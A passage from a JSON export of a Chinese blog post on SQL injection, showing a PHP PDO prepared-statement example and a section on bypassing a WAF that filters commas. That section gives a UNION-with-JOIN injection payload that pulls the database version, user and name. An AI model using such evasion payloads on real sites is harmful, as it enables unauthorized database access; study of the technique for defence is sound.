class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVlemh4aW5nL3AvNTI4MjQzNy5odG1s\">PDO 防 sql 注入原理分析 - leezhxing - 博客园 (cnblogs.com)</span></p>\n<h3 id=\"绕过waf\"><a class=\"markdownIt-Anchor\" href=\"#绕过waf\">#</a> 绕过 waf</h3>\n<p>1. 过滤，</p>\n<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>\n<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>\n",
            "tags": [
                "SQL injection"
            ]
        }
    ]
}